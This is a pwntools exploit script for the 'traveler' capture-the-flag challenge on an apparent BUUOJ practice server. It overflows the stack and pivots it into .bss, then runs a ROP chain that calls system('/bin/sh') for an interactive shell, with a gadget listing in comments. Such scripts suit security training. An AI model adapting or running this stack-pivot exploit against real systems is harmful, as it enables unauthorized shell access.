from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node4.buuoj.cn", 28893)
# io=process("./traveler")
elf=ELF("./traveler")

# gdb.attach(io)
# pause()

leave_ret=0x401253
read_text=0x401216
pop_rdi=0x4012c3
bss_addr=0x404d00
msg_addr=0x4040a0
sys_addr=elf.plt[b"system"]

io.recvuntil(b"?\n")
payload=cyclic(0x20)+p64(bss_addr)+p64(read_text)
payload=payload.ljust(0x30,b"a")
io.send(payload)
io.recvuntil(b"life?\n")
io.send(b"a")


payload=p64(pop_rdi)+p64(msg_addr)+p64(sys_addr)
payload=payload.ljust(0x20,b"a")+p64(bss_addr-0x28)+p64(leave_ret)
io.send(payload)

io.recvuntil(b"life?\n")
io.send(b"/bin/sh\x00")

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000401253 : leave ; ret
# 0x00000000004012bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012be : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012c0 : pop r14 ; pop r15 ; ret
# 0x00000000004012c2 : pop r15 ; ret
# 0x00000000004012bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012bf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040117d : pop rbp ; ret
# 0x00000000004012c3 : pop rdi ; ret
# 0x00000000004012c1 : pop rsi ; pop r15 ; ret
# 0x00000000004012bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12